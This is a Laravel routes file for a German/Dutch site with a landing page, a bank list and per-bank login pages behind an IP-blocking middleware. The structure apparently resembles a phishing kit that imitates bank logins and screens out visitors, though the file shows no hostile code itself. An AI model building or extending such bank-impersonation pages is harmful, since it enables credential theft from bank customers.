<?php

use App\Http\Controllers\BankLoginController;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

require __DIR__.'/auth.php';

// Redirect root → /de
Route::get('/', fn() => redirect('/de'));

Route::prefix('{locale}')
    ->where(['locale' => 'de|nl'])
    ->middleware('locale')
    ->group(function () {
        Route::get('/', fn() => Inertia::render('Landing'));
        Route::get('/banks', fn() => Inertia::render('BanksList'));
        Route::get('/info', fn() => Inertia::render('Info'));

        Route::middleware(['blocked.ip'])->group(function () {
            foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
                Route::get('/' . $slug, [BankLoginController::class, 'show'])
                    ->defaults('bankSlug', $slug)
                    ->name('bank-login.' . $slug);
            }
        });
    });
